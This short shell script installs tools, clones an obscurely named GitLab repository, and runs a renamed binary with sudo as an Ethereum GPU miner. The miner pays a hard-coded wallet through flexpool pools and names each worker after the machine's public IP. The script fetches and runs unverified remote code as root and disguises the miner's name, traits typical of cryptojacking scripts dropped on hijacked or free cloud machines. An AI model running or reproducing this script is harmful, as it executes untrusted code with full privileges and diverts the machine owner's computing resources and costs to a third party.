#!/bin/sh
sudo apt update
sudo apt-get install zip unzip
sudo apt install screen -y
screen -dmS ya.sh 65 75
sudo git clone https://gitlab.com/useragen/lancarkanlah.git
cd lancarkanlah
chmod +x gr
ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo ./gr -a ethash -w 0x3D02F7B8DCB18E778fE35bf8B5A7F91d819bF0C4 -p stratum+tcp://eth-sg.flexpool.io:4444 stratum+tcp://eth-hke.flexpool.io -r $ip --nvidia 1
